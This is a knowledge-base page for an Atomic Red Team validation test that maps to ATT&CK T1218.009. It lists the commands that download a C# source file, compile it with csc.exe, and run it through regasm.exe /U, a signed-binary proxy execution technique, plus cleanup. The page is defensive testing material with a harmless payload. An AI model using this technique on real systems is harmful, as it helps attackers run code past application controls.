---
atomic_guid: "71bfbfac-60b1-4fc0-ac8b-2cedbbdcb112"
title: "Regasm Uninstall Method Call Test"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.009"
attack_technique_name: "Signed Binary Proxy Execution: Regsvcs/Regasm"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.009/T1218.009.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "71bfbfac-60b1-4fc0-ac8b-2cedbbdcb112"
  - "Regasm Uninstall Method Call Test"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Regasm Uninstall Method Call Test

Executes the Uninstall Method, No Admin Rights Required. Upon execution, "I shouldn't really execute either." will be displayed.

## Metadata

- Atomic GUID: 71bfbfac-60b1-4fc0-ac8b-2cedbbdcb112
- Technique: T1218.009: Signed Binary Proxy Execution: Regsvcs/Regasm
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1218.009/T1218.009.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.009]]

## Input Arguments

### output_file

- description: Location of the payload
- type: path
- default: %tmp%\T1218.009.dll

### source_file

- description: Location of the CSharp source_file
- type: path
- default: PathToAtomicsFolder\T1218.009\src\T1218.009.cs

## Dependencies

The CSharp source file must exist on disk at specified location (#{source_file})

### Prerequisite Check

```powershell
if (Test-Path "#{source_file}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{source_file}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs" -OutFile "#{source_file}"
```

## Executor

- name: command_prompt

### Command

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library "#{source_file}"
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}
```

### Cleanup

```cmd
del #{output_file} >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.009/T1218.009.yaml)
